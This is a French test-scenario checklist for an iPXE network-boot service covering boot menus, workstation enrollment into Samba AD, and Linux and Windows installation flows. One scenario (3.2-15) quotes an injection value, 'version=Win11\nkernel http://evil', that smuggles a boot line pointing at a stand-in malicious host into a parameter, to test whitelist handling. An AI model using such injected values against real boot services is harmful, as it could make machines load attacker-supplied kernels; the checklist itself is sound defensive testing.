- [ ] Scénario 3.1-4 (poste inconnu) : menu default minimal
- [ ] Scénario 3.1-5 (LAN restriction) : 403 hors LAN
- [ ] Scénario 3.1-6 (non-régression `/ipxe/admin.php`) : catchall répond
- [ ] Scénario 3.1-7 (court-circuit catchall) : pas de row legacy_catchall_logs pour /ipxe/boot
- [ ] Scénario 3.1-8 (MachineBootLog peuplé) : rows `action='ipxe_boot'`
- [ ] Scénario 3.1-9 (smoke poste réel) — optionnel, valide en pré-prod
- [ ] Scénario 3.2-1 (handshake /ipxe/admin) : préambule + chain admin##params
- [ ] Scénario 3.2-2 (menu admin poste connu) : item maintenance + exit + retour
- [ ] Scénario 3.2-3 (menu admin poste inconnu) : item --key n set-name + pas d'item maintenance (modifié 3.3 — voir Scénario 3.3-1)
- [ ] Scénario 3.2-4 (handshake /ipxe/maintenance)
- [ ] Scénario 3.2-5 (menu maintenance) : rescuecd + winpe + factory_reset
- [ ] Scénario 3.2-6 (action rescuecd) : kernel sysresccd + 3 initrds
- [ ] Scénario 3.2-7 (action winpe) : kernel wimboot + initrds Win10
- [ ] Scénario 3.2-8 (action factory_reset) : kernel clonezilla + restoreparts
- [ ] Scénario 3.2-9 (action inconnue) : 404 + log warning
- [ ] Scénario 3.2-10 (catchall legacy /ipxe/admin.php) : 200 servi par catchall
- [ ] Scénario 3.2-11 (bascule known→admin natif) : chain sans `.php`
- [ ] Scénario 3.2-12 (MachineBootLog 3.2) : 3 actions persistées
- [ ] Scénario 3.2-13 (smoke poste réel) — optionnel, pré-prod uniquement
- [ ] Scénario 3.2-14 (post-correctif #1 — params block admin+maintenance) : `params\nparam mac\nparam uuid` en tête, pas de row `unknown:<ip>` après chain
- [ ] Scénario 3.2-15 (post-correctif #2 — whitelist version winpe) : injection `version=Win11\nkernel http://evil` → fallback Win11 pur
- [ ] Scénario 3.2-16 (post-correctif #3 — warning factory_reset) : event `ipxe.action.factory_reset_dispatched` niveau warning
- [ ] Scénario 3.3-1 (handshake enrollment/name) : préambule + chain
- [ ] Scénario 3.3-2 (création poste neuf) : Workstation + AD samba-tool computer create + netbootGUID
- [ ] Scénario 3.3-3 (idempotent same name) : message "deja enregistree"
- [ ] Scénario 3.3-4 (nom déjà pris) : ERREUR + pas de modification
- [ ] Scénario 3.3-5 (renommage delete+recreate AD plan B D14)
- [ ] Scénario 3.3-6 (affectation salle physique)
- [ ] Scénario 3.3-7 (room — poste inconnu) : erreur + chain admin
- [ ] Scénario 3.3-8 (ajout parc logique) : pivot + observer
- [ ] Scénario 3.3-9 (retrait parc logique)
- [ ] Scénario 3.3-10 (anti-injection nom) : 200 + ERREUR + pas de samba-tool
- [ ] Scénario 3.3-11 (non-régression menu admin natif — items enrollment)
- [ ] Scénario 3.3-12 (non-régression catchall `/ipxe/enregistrement.php` legacy)
- [ ] Scénario 3.3-13 (MachineBootLog peuplé pour 5 actions enrollment)
- [ ] Scénario 3.3-14 (BYOD audit-only — pas de Workstation ni AD)
- [ ] Scénario 3.3-15 (feature-flag enrollment.enabled=false)
- [ ] Scénario 3.3-16 (smoke poste réel — optionnel pré-prod)
- [ ] Scénario 3.4-1 (menu installation-linux poste connu) : 9 items install_*
- [ ] Scénario 3.4-2 (menu installation-linux poste inconnu) : message erreur + chain admin
- [ ] Scénario 3.4-3 (item `(l)` Installation Linux dans /ipxe/admin) : visible si enabled, masqué si IPXE_INSTALL_LINUX_ENABLED=false
- [ ] Scénario 3.4-4 (action install_deb_gnome) : kernel debian-installer + URL preseed avec os=trixie&type=gnome
- [ ] Scénario 3.4-5 (action install_ubuntu64) : kernel ubuntu-installer + perso=1
- [ ] Scénario 3.4-6 (action install_nird) : kernel /nird/casper + NFS root
- [ ] Scénario 3.4-7 (preseed debian/gnome) : ~4000 chars + tasksel gnome-desktop + hostname interpolé + audit MachineBootLog
- [ ] Scénario 3.4-8 (preseed poste inconnu) : 404 + log warning
- [ ] Scénario 3.4-9 (preseed os/type hors whitelist) : 422 + log warning invalid_distribution|invalid_variant
- [ ] Scénario 3.4-10 (hook /ipxe/linux/action ret=0) : Workstation.os='linux' + status='installation Linux terminee' + MachineBootLog
- [ ] Scénario 3.4-11 (stub /ipxe/linux/autorun) : #!/bin/bash + echo + exit 0
- [ ] Scénario 3.4-12 (sécurité LAN) : 403 hors LAN
- [ ] Scénario 3.4-13 (non-régression menu admin) — optionnel : items 3.2+3.3+3.4 cohabitent
- [ ] Scénario 3.4-14 (smoke poste réel install Debian) — optionnel pré-prod
- [ ] Scénario 3.5-1 (menu installation-windows poste connu) : 7 items install_win*
- [ ] Scénario 3.5-2 (menu installation-windows poste inconnu) : message erreur + chain admin
- [ ] Scénario 3.5-3 (item `(w)` Installation Windows dans /ipxe/admin) : visible si enabled, masqué si IPXE_INSTALL_WINDOWS_ENABLED=false
- [ ] Scénario 3.5-4 (action install_win11) : kernel Win10/wimboot + initrds + BCD/boot.wim Win11
- [ ] Scénario 3.5-5 (action install_win10_perso) : perso=1 dans cmdline
- [ ] Scénario 3.5-6 (action install_win11_disk) : disk=1 dans cmdline
- [ ] Scénario 3.5-7 (install.bat Win11 UEFI) : CRLF strict + setup.exe + URL native action
- [ ] Scénario 3.5-8 (unattend.xml Win11 UEFI) : DOMDocument valid + BypassTPM + UnattendedJoin + ComputerName
- [ ] Scénario 3.5-9 (unattend.xml poste inconnu) : 404 + log warning
- [ ] Scénario 3.5-10 (unattend.xml version hors whitelist) : 422 + log warning
- [ ] Scénario 3.5-11 (hook /ipxe/windows/action winpe) : Workstation.status='installation WinPE' + MachineBootLog
- [ ] Scénario 3.5-12 (hook /ipxe/windows/action oobe) : Workstation.os='windows' + status='installation Windows terminee'
- [ ] Scénario 3.5-13 (hook étape déférée sysprep) : 200 + log warning unsupported_step
- [ ] Scénario 3.5-14 (diskpart.txt iso-legacy) : body strict + MachineBootLog
- [ ] Scénario 3.5-15 (sysprep.xml stub) : 200 + body vide + log info stub_served
- [ ] Scénario 3.5-16 (sécurité LAN) : 403 hors LAN
- [ ] Scénario 3.5-17 (non-régression catchall `.php`) : Win10/repair.bat.php + clonage.php + installation-windows.php restent via catchall
- [ ] Scénario 3.5-18 (smoke poste réel install Win11) — optionnel pré-prod

> Smoke automatisable : voir Story 3.1 et 3.2 § "Smoke test à exécuter quand VM up"
> dans `_bmad-output/implementation-artifacts/3-1-ipxe-service-core.md`.
